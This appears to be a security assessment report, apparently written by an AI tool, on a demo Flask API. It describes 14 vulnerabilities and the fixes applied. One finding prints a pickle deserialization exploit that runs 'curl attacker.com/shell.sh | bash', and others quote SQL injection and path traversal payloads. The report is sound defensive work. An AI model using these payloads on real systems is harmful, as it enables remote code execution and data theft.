# Security Assessment Report
## kiro-scan-demo — Flask REST API

| Field            | Detail                                      |
|------------------|---------------------------------------------|
| **Application**  | kiro-scan-demo (Flask REST API)             |
| **Assessment Date** | 2026-10-09                               |
| **Scope**        | Full source — app.py, auth.py, db.py, config.py |
| **Standard**     | OWASP Top 10 (2021)                         |
| **Status**       | All critical and high findings remediated   |

---

## 1. Executive Summary

A full source-code security review of the kiro-scan-demo Flask application was
conducted on 2026-10-09. The application is a REST API providing user
registration, authentication, note management, and file upload/download
capabilities.

The initial review identified **14 security findings** spanning every major
OWASP Top 10 category. Two findings were rated **CRITICAL** — either one was
sufficient to give an unauthenticated attacker complete control of the server.
Eight findings were rated **HIGH**, and four were rated **MEDIUM**. In its
original state, the application was not safe to operate on any network.

All 14 findings have been remediated in the current codebase. The two critical
remote-code-execution vectors — insecure pickle deserialization and SQL
injection — have been eliminated. Authentication has been rebuilt on a
cryptographically sound foundation. Sensitive configuration has been moved out
of source code entirely. Input validation and rate limiting have been added
across all endpoints.

The application's security posture has moved from **Critical / Undeployable**
to a baseline that is suitable for continued development and internal testing.
A set of forward-looking hardening tasks remain recommended before any
production deployment.

### Risk Rating Before and After Remediation

| Dimension                      | Before      | After         |
|-------------------------------|-------------|---------------|
| Overall risk                  | Critical    | Low–Medium    |
| Remote code execution risk    | Active      | Eliminated    |
| Authentication integrity      | Broken      | Sound         |
| SQL injection exposure        | Present     | Eliminated    |
| Credential / secret exposure  | Present     | Eliminated    |
| Input validation              | None        | Enforced      |

---

## 2. Findings — Original State

### 2.1 CRITICAL Findings (2)

---

#### F-01 — Insecure Deserialization → Remote Code Execution
**Severity:** CRITICAL | **OWASP:** A08:2021 — Software and Data Integrity Failures
**Files:** `auth.py:44`, `auth.py:51`, `app.py:50`

**Description**
Session tokens issued at login were Python `pickle` blobs, base64-encoded and
handed to the client. On every authenticated request, the server decoded the
header value and called `pickle.loads()` on it directly. The `pickle` format
can encode arbitrary Python object construction — including `os.system()` calls.
No valid credentials were required to exploit this.

**Impact**
A single crafted HTTP request gave any attacker a remote OS shell running as the
web process. Full server compromise: arbitrary file read/write/delete, database
exfiltration, lateral movement to internal networks.

**Attack Scenario**
```
# Attacker builds a malicious pickle payload
import pickle, base64, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))
token = base64.b64encode(pickle.dumps(Exploit())).decode()
# Send as X-Session-Token header to any authenticated endpoint
```

---

#### F-02 — SQL Injection — Authentication Bypass
**Severity:** CRITICAL | **OWASP:** A03:2021 — Injection
**File:** `db.py:35–38`

**Description**
The `get_user_by_username()` function concatenated the user-supplied `username`
directly into a raw SQL string:
```python
query = "SELECT * FROM users WHERE username = '" + username + "'"
```

**Impact**
- Authentication bypass with payload `' OR '1'='1' --` — returns first user row.
- Full `users` table dump via UNION-based injection.
- Blind enumeration of all data in the database.

---

### 2.2 HIGH Findings (8)

---

#### F-03 — SQL Injection — Note Search
**Severity:** HIGH | **OWASP:** A03:2021 — Injection
**File:** `db.py:44–51`

Both `user_id` and `keyword` were concatenated into the `search_notes()` query.
An authenticated attacker could bypass the `user_id` filter and read any user's
notes, or dump the `users` table via UNION injection.

---

#### F-04 — Path Traversal — Arbitrary File Read
**Severity:** HIGH | **OWASP:** A01:2021 — Broken Access Control
**File:** `app.py:125–127`

The `/download` endpoint joined a user-supplied `filename` with `UPLOAD_FOLDER`
without sanitization. `os.path.join("/tmp/uploads", "../../etc/passwd")` resolves
to `/etc/passwd`. Any authenticated user could read any file accessible to the
web process — private keys, source code, database files, AWS credential files.

---

#### F-05 — Unrestricted File Upload
**Severity:** HIGH | **OWASP:** A05:2021 — Security Misconfiguration
**File:** `app.py:111–115`

No extension check, MIME validation, size limit, or filename sanitization. Any
file type — `.py`, `.sh`, `.php`, executables — could be uploaded and stored on
the server. The raw `file.filename` was used, allowing path traversal in the
filename itself (e.g., `../../../etc/cron.d/backdoor`).

---

#### F-06 — Weak Password Hashing — MD5, No Salt
**Severity:** HIGH | **OWASP:** A07:2021 — Identification and Authentication Failures
**File:** `auth.py:15`

`hashlib.md5(password.encode()).hexdigest()` — no salt, no work factor,
no iterations. MD5 is not a password hashing algorithm. Identical passwords
produce identical hashes (enabling batch cracking). Pre-computed rainbow tables
crack most hashes instantly with no GPU required.

---

#### F-07 — Plaintext Passwords Written to Logs
**Severity:** HIGH | **OWASP:** A09:2021 — Security Logging and Monitoring Failures
**Files:** `auth.py:24`, `auth.py:34`

Every login attempt and registration wrote the plaintext password to the
application log at DEBUG level, which was always enabled. Log aggregators,
SIEM tools, monitoring dashboards, and log files on disk permanently recorded
every user's password.

---

#### F-08 — Hardcoded Secrets in Source Code
**Severity:** HIGH | **OWASP:** A02:2021 — Cryptographic Failures
**File:** `config.py:9`, `config.py:12–13`

`SECRET_KEY = "supersecret123"`, `ADMIN_USERNAME = "admin"`,
`ADMIN_PASSWORD = "admin123"` were committed directly to source. Any developer
with repository access — past or present — holds these credentials permanently.

---

#### F-09 — Admin Credentials in URL Query Parameters
**Severity:** HIGH | **OWASP:** A02:2021 — Cryptographic Failures
**File:** `app.py:139–140`

`GET /admin?username=admin&password=admin123` — query parameters are logged
verbatim in every web server access log, load balancer log, proxy log, browser
history, and HTTP Referer header.

---

#### F-10 — Broken Admin Authorization + Password Hash Exposure
**Severity:** HIGH | **OWASP:** A01:2021 — Broken Access Control
**File:** `app.py:135–153`

Admin "authentication" was a hardcoded string comparison. The endpoint returned
`password` hashes for all users in the response. Combined with MD5 (F-06), this
was equivalent to returning plaintext passwords to any caller.

---

#### F-11 — Debug Mode Enabled — Werkzeug Interactive Debugger Exposed
**Severity:** HIGH | **OWASP:** A05:2021 — Security Misconfiguration
**Files:** `config.py:17`, `app.py:159`

`DEBUG = True` hardcoded, `host="0.0.0.0"` binding all interfaces. The Werkzeug
debugger renders an interactive Python console in the browser on any unhandled
exception. With the correct debugger PIN (derivable from server metadata), an
attacker executes arbitrary Python on the server through the browser — no other
vulnerability required.

---

### 2.3 MEDIUM Findings (4)

---

#### F-12 — No Rate Limiting on Login (Brute Force)
**Severity:** MEDIUM | **OWASP:** A07:2021 — Authentication Failures
**File:** `app.py:38–51`

No delay, lockout, or CAPTCHA on `/login`. Combined with MD5 hashing (F-06),
an attacker could script thousands of password attempts per second.

---

#### F-13 — No Input Validation on Any Endpoint
**Severity:** MEDIUM | **OWASP:** A03:2021 — Injection
**Files:** `app.py:29–32`, `app.py:40–42`, `app.py:96–97`

Bare `data["key"]` access on unvalidated `request.get_json()`. A non-JSON body
returned `None`, causing a `TypeError` crash (500 response). Missing keys caused
`KeyError`. No length limits, no type checks, no empty-string checks. With
`DEBUG=True`, full Python tracebacks were sent to the client.

---

#### F-14 — No Session Expiry or Revocation
**Severity:** MEDIUM | **OWASP:** A07:2021 — Authentication Failures
**File:** `auth.py:41–52`

Tokens were valid forever — no TTL, no server-side store, no logout mechanism.
A stolen token granted permanent access with no time window for detection and
response. A user changing their password did not invalidate existing sessions.

---

## 3. Actioned Items — Remediation Applied

All 14 findings have been remediated. The table below maps each finding to the
specific code change applied.

| ID   | Finding                               | Sev      | File(s)            | Remediation Applied |
|------|---------------------------------------|----------|--------------------|---------------------|
| F-01 | Insecure deserialization / RCE        | CRITICAL | auth.py            | `pickle` removed; replaced with `itsdangerous.URLSafeTimedSerializer` (HMAC-signed, 1-hour TTL, JSON payload — no deserialization attack surface) |
| F-02 | SQL injection — auth bypass           | CRITICAL | db.py              | `get_user_by_username()` converted to parameterized query `WHERE username = ?` |
| F-03 | SQL injection — note search           | HIGH     | db.py              | `search_notes()` converted to `WHERE user_id = ? AND title LIKE ?` with bound pattern |
| F-04 | Path traversal — file read            | HIGH     | app.py             | `secure_filename()` + `os.path.realpath()` boundary check ensures resolved path stays inside `UPLOAD_FOLDER` |
| F-05 | Unrestricted file upload              | HIGH     | app.py             | `secure_filename()` strips path components; extension validated against allowlist `{txt,pdf,png,jpg,jpeg,gif,csv}`; `MAX_CONTENT_LENGTH` = 5 MB enforced |
| F-06 | MD5 password hashing                  | HIGH     | auth.py            | `hashlib.md5` replaced with `bcrypt` (rounds=12, auto-salted) |
| F-07 | Passwords in logs                     | HIGH     | auth.py            | Password argument removed from all `logger.*` calls in `login()` and `register()` |
| F-08 | Hardcoded secrets in source           | HIGH     | config.py          | All secrets (`SECRET_KEY`, `ADMIN_USERNAME`, `ADMIN_PASSWORD`) read via `_require_env()` which fails fast at startup if any variable is unset; `.env.example` created |
| F-09 | Admin credentials in URL params       | HIGH     | app.py             | `/admin` changed to `POST`; credentials read from JSON request body |
| F-10 | Broken admin auth + hash exposure     | HIGH     | app.py, db.py      | `hmac.compare_digest()` for constant-time credential comparison; `db.get_all_users()` selects only `id, username` — password column never returned |
| F-11 | Debug mode / Werkzeug debugger        | HIGH     | config.py, app.py  | `DEBUG` reads `FLASK_DEBUG` env var, defaults to `False`; log level set conditionally |
| F-12 | No rate limiting on login             | MEDIUM   | app.py             | `flask-limiter` applied: `/login` → 5/minute per IP, `/register` → 10/minute per IP |
| F-13 | No input validation                   | MEDIUM   | app.py             | `get_json(silent=True)` on all endpoints; presence, type, and length validated before use; `@require_session` decorator centralizes auth check across all protected routes |
| F-14 | No session expiry                     | MEDIUM   | auth.py            | `itsdangerous` `max_age=3600` enforces 1-hour token TTL; expired tokens return `None` and are rejected with HTTP 401 |

### Additional improvements made during remediation

| Improvement | Details |
|-------------|---------|
| Dependency pinning | `requirements.txt` updated with pinned versions: `itsdangerous==2.1.2`, `bcrypt==4.1.3`, `Flask-Limiter==3.5.0` |
| Connection leak prevention | All `db.py` functions use `with get_connection() as conn:` context managers — connections cannot leak on exception |
| `sqlite3.Row` factory | DB rows accessible by column name, reducing positional-index fragility |
| Global error handlers | 404, 405, 413, 500 handlers return structured JSON — no raw tracebacks to clients |
| Structured logging format | `%(asctime)s %(levelname)s %(name)s` format applied uniformly |
| Bare `except:` removed | Download route now catches `OSError` specifically with logging and returns `500` not `200` |
| `.env.example` | Documents all required environment variables with generation instructions |

---

## 4. Forward-Looking Hardening Plan

The remediation above addresses all identified vulnerabilities. The items below
are recommended before any production deployment and are prioritised by impact.

---

### Phase 1 — Pre-Production (Required)

**P1-01 — Replace SQLite with a production database**
SQLite is a single-file database with no network isolation, no access controls,
and no connection pooling. Use PostgreSQL or MySQL behind a dedicated service
account with minimum required privileges (SELECT/INSERT/UPDATE on app tables only).
No DROP, CREATE, or schema-level permissions.

**P1-02 — Run behind a production WSGI server**
Never use `app.run()` in production. Use `gunicorn` with multiple workers:
```bash
gunicorn -w 4 --bind 0.0.0.0:5000 --timeout 30 app:app
```
Place Nginx or a cloud load balancer in front to handle TLS termination, request
buffering, and connection limiting.

**P1-03 — Enforce HTTPS**
All API traffic must be encrypted in transit. Obtain a TLS certificate (Let's
Encrypt or a managed certificate from the cloud provider). Set
`SESSION_COOKIE_SECURE=True` and `SESSION_COOKIE_HTTPONLY=True` once cookies
are used. Add HSTS headers via Nginx.

**P1-04 — Rotate all secrets**
The previously hardcoded values (`supersecret123`, `admin123`) are permanently
compromised. Generate new values before any deployment:
```bash
# Generate a new SECRET_KEY
python3 -c "import secrets; print(secrets.token_hex(32))"
```
Store in AWS Secrets Manager, HashiCorp Vault, or the CI/CD secret store —
never in `.env` files committed to version control.

**P1-05 — Move rate limiter storage to Redis**
The current `storage_uri="memory://"` in `app.py` means rate limit counters are
per-process and reset on restart. In production with multiple gunicorn workers
or multiple instances, each worker has its own counter, effectively multiplying
the limit by the number of workers. Use Redis:
```python
storage_uri=os.environ["REDIS_URL"]   # e.g., "redis://localhost:6379/0"
```

**P1-06 — Implement token revocation**
The current 1-hour TTL prevents indefinite session lifetime but cannot
immediately revoke a stolen token. Add a Redis-backed denylist:
```python
# On logout or password change: add token jti to a Redis set with TTL matching
# the token's remaining validity.
# On load_user_session: check the jti is not in the denylist before returning.
```

**P1-07 — Add a `UNIQUE` constraint on username + audit duplicate handling**
`db.py` already defines `username TEXT NOT NULL UNIQUE` in the DDL, but
`add_user()` does not currently catch `sqlite3.IntegrityError`. The `register()`
route returns HTTP 409 on any exception — add explicit handling to distinguish
duplicate usernames from other errors, and return a precise error message.

---

### Phase 2 — Security Hardening (Recommended)

**P2-01 — Add account lockout after repeated login failures**
`flask-limiter` rate-limits by IP, which is bypassable from multiple IPs.
Supplement with per-username tracking: after 10 failed attempts within 15 minutes,
lock the account for 30 minutes and send a notification to the registered email.

**P2-02 — Implement role-based access control (RBAC)**
The admin panel currently authenticates via a separate username/password. Add an
`is_admin` boolean column to the `users` table and protect `/admin` with
`@require_session` plus a role check, eliminating the second credential pair.

**P2-03 — Add security response headers**
Add the following HTTP response headers via Nginx or a Flask `after_request` hook:

| Header | Recommended Value |
|--------|-------------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` |
| `X-Content-Type-Options` | `nosniff` |
| `X-Frame-Options` | `DENY` |
| `Content-Security-Policy` | `default-src 'none'` (API-only, no HTML) |
| `Referrer-Policy` | `no-referrer` |

**P2-04 — Structured security logging and alerting**
Log the following events to a SIEM or alerting pipeline:
- Repeated login failures for the same username (credential stuffing signal)
- Path traversal attempts blocked by the download endpoint
- Admin panel access (all attempts, success and failure)
- File upload of blocked extensions
- Token signature validation failures (possible active attack)

**P2-05 — Parameterize the upload file extension allowlist**
`ALLOWED_EXTENSIONS` is currently hardcoded in `app.py`. Move it to `config.py`
and read from an environment variable so it can be tightened per-deployment
without a code change.

**P2-06 — Virus / malware scanning on uploaded files**
Even with an extension allowlist, uploaded files may contain malicious content
(e.g., a PDF with embedded JavaScript, a PNG with an exploit payload). Integrate
ClamAV or a cloud scanning API (e.g., Amazon GuardDuty Malware Protection for S3)
before files are persisted.

**P2-07 — Store uploaded files in object storage, not local disk**
Local disk (`/tmp/uploads`) is ephemeral (lost on container restart), not
scalable across multiple instances, and shares the filesystem with the
application. Use Amazon S3 or equivalent with a private bucket, server-side
encryption, and a pre-signed URL for downloads rather than serving files through
the application.

---

### Phase 3 — Operational Security (Ongoing)

**P3-01 — Dependency vulnerability scanning**
Integrate `pip-audit` or Dependabot into the CI pipeline. All dependencies are
currently pinned — keep them updated as patches are released.
```bash
pip-audit -r requirements.txt
```

**P3-02 — Static analysis in CI**
Add `bandit` (Python security linter) and `semgrep` (OWASP ruleset) as required
CI checks on every pull request. Block merges on high-severity findings.
```bash
bandit -r . -ll
semgrep --config=p/owasp-top-ten .
```

**P3-03 — Penetration testing before production launch**
Commission an external penetration test covering authentication, authorization,
injection, file handling, and session management. Internal review and automated
scanning do not substitute for manual adversarial testing.

**P3-04 — Secret scanning in version control**
Enable GitHub/GitLab secret scanning or integrate `truffleHog` / `gitleaks` into
pre-commit hooks to prevent future accidental credential commits.
```bash
gitleaks detect --source . --verbose
```

**P3-05 — Incident response plan**
Define and document the process for:
- Rotating secrets on suspected compromise
- Invalidating all active sessions (flush token denylist or rotate `SECRET_KEY`)
- Notifying affected users
- Preserving logs for forensic analysis

---

## 5. Residual Risk Summary

After the completed remediation, the following residual risks remain acceptable
for development/testing environments but must be addressed before production:

| Residual Risk | Current Mitigation | Required Before Production |
|---------------|--------------------|---------------------------|
| SQLite single-file DB | Only used in testing | Replace with PostgreSQL (P1-01) |
| In-memory rate limit counters | Acceptable for single process dev | Redis-backed limiter (P1-05) |
| No token revocation on logout | 1-hour TTL limits window | Redis denylist (P1-06) |
| No TLS | Dev/local only | TLS + HSTS (P1-03) |
| No RBAC | Single admin credential via env | Role column + @require_session (P2-02) |
| Local file storage | Dev/local only | S3 + presigned URLs (P2-07) |

---

## 6. Files Modified

| File | Status | Changes |
|------|--------|---------|
| `config.py` | Modified | All secrets moved to `_require_env()`; `DEBUG` env-controlled; `MAX_CONTENT_LENGTH` added |
| `db.py` | Modified | Parameterized queries throughout; context manager connections; `get_all_users()` without password column |
| `auth.py` | Modified | `pickle` → `itsdangerous`; `MD5` → `bcrypt`; passwords removed from logs |
| `app.py` | Modified | `@require_session` decorator; input validation; path traversal fix; upload allowlist; admin POST body; global error handlers; rate limiting |
| `requirements.txt` | Modified | Added `itsdangerous==2.1.2`, `bcrypt==4.1.3`, `Flask-Limiter==3.5.0` |
| `.env.example` | Created | Documents all required environment variables |

---

*Assessment conducted and remediation applied by Kiro AI — 2026-10-09*
